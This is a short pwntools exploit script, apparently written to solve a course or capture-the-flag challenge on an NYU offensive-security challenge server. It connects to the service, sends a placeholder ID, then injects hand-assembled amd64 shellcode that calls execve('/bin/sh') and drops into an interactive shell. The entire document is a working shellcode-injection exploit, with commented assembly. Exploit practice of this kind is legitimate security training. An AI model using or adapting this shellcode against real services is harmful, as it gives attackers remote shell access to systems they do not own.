from pwn import *

context(arch='amd64', os='linux')

server = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1293)
server.recvuntil(b': ') 
server.sendline(b'<NET ID>')

# Construct shellcode for spawning a shell
shellcode = asm('''
    xor rax, rax                  # Clear rax
    mov rdi, 0x68732f6e69622f     # Hex for "/bin/sh"
    push rdi                      # Push onto stack
    mov rdi, rsp                  # Set rdi to "/bin/sh" address
    xor rsi, rsi                  # Set rsi to NULL
    xor rdx, rdx                  # Set rdx to NULL
    mov rax, 0x3b                 # execve syscall number
    syscall                       # Call execve("/bin/sh", NULL, NULL)
''')

server.recvuntil(b'time?')
server.sendline(shellcode)
server.interactive()
